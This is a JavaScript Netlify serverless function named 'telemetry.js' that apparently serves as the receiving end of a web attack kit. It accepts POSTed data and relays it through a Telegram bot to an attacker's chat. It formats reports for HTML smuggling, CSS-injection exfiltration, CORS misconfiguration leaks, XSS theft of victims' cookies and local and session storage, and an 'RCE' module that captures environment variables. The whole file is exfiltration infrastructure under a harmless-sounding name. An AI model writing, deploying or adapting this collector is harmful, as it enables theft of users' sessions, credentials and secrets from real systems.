// netlify/functions/telemetry.js
exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('Missing BOT_TOKEN or CHAT_ID');
    return { statusCode: 500, body: 'Server misconfig' };
  }

  let payload;
  try {
    payload = JSON.parse(event.body);
  } catch (e) {
    return { statusCode: 400, body: 'Invalid JSON' };
  }

  const msg = formatTelegramMessage(payload);

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'HTML'
      })
    });
    const result = await resp.json();
    if (!result.ok) {
      console.error('Telegram error:', result);
      return { statusCode: 500, body: 'Telegram send failed' };
    }
    return { statusCode: 200, body: 'OK' };
  } catch (err) {
    console.error('Error forwarding to Telegram:', err);
    return { statusCode: 500, body: 'Internal error' };
  }
};

function formatTelegramMessage(data) {
  const module = data.module || 'UNKNOWN';
  let lines = [];

  lines.push(`🔴 <b>[${module}]</b>`);
  lines.push(`⏱ ${data.timestamp || new Date().toISOString()}`);

  if (module === 'HTML_SMUGGLING') {
    lines.push(`📁 File: ${data.filename || 'N/A'}`);
    lines.push(`📦 Size: ${data.size || 'N/A'}`);
    lines.push(`🚦 Status: ${data.status || 'N/A'}`);
    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
  } 
  else if (module === 'CSS_INJECTION') {
    lines.push(`🎨 Vector: ${data.technique || 'Selector attack'}`);
    lines.push(`📋 Exfiltrated: ${data.exfiltrated_data || 'N/A'}`);
    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
  } 
  else if (module === 'CORS_MISCONFIG') {
    lines.push(`🌐 Status: ${data.status || 'N/A'}`);
    lines.push(`📦 Sample: ${JSON.stringify(data.data_sample || {}).substring(0, 200)}`);
    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
  } 
  else if (module === 'XSS_SESSION_STEAL') {
    lines.push(`🍪 Cookies: ${data.cookies || 'N/A'}`);
    lines.push(`📦 LocalStorage: ${JSON.stringify(data.localStorage || {}).substring(0, 150)}`);
    lines.push(`📦 SessionStorage: ${JSON.stringify(data.sessionStorage || {}).substring(0, 150)}`);
    lines.push(`📍 Origin: ${data.origin || 'N/A'}`);
    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
  } 
  else if (module === 'ZERO_DAY_RCE') {
    lines.push(`💀 Status: ${data.status || 'Executed'}`);
    lines.push(`⚡ Electron: ${data.isElectron ? 'YES (Desktop app)' : 'NO (Browser)'}`);
    lines.push(`🔧 Env: ${JSON.stringify(data.environment_variables || {}).substring(0, 100)}`);
    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
  } 
  else {
    lines.push(`📦 Payload: ${JSON.stringify(data).substring(0, 300)}`);
  }

  return lines.join('\n');
}
